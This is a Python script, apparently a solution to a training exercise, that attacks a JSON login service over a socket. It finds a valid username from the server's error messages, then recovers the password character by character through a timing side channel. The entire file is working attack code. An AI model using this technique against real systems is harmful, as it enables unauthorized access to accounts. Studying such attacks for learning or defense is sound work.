import argparse
import itertools
import json
import socket
import string
import time

parser = argparse.ArgumentParser(prog='Password Hacker with Python', description='Hacks something')
parser.add_argument('ip')
parser.add_argument('port')

args = parser.parse_args()

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((args.ip, int(args.port)))

valid_login = ""


def case_permutations(word):
    """Erzeugt alle Groß-/Kleinschreibungsvarianten eines Strings."""
    return (''.join(variant) for variant in itertools.product(*((c.lower(), c.upper()) for c in word)))


with open("logins.txt", "r") as loginfile:
    logins = loginfile.readlines()

    for login in logins:
        login = login.strip()  # Entferne unnötige Whitespace-Zeichen
        # Teste jede Groß-/Kleinschreibungsvariante des Usernamens
        for login_variant in case_permutations(login):
            cred = {"login": login_variant, "password": "1234"}
            connection.send(json.dumps(cred).encode())
            response = connection.recv(1024)
            response_json = json.loads(response.decode())
            if response_json["result"] == "Wrong password!":
                valid_login = login_variant
                break
        else:
            continue  # Fortsetzen mit der nächsten Zeile, wenn keine Kombination erfolgreich war
        break  # Beenden der äußeren Schleife, wenn ein gültiger Login gefunden wurde

# Find the password
password_valid = False
password_build = ""
password_components = string.ascii_letters + string.digits

while not password_valid:
    for char in password_components:
        password_tmp = password_build + char
        cred = {"login": valid_login, "password": password_tmp}
        start = time.time()
        connection.send(json.dumps(cred).encode())
        response = connection.recv(1024)
        end = time.time()
        # print(f"DEBUG: {end - start}")
        response_json = json.loads(response.decode())
        if response_json["result"] == "Connection success!":
            password_valid = True
            password_build = password_tmp
            break
        elif end - start < 0.001:
            continue
        else:
            password_build = password_tmp
            continue
connection.close()
print(json.dumps({"login": valid_login, "password": password_build}))
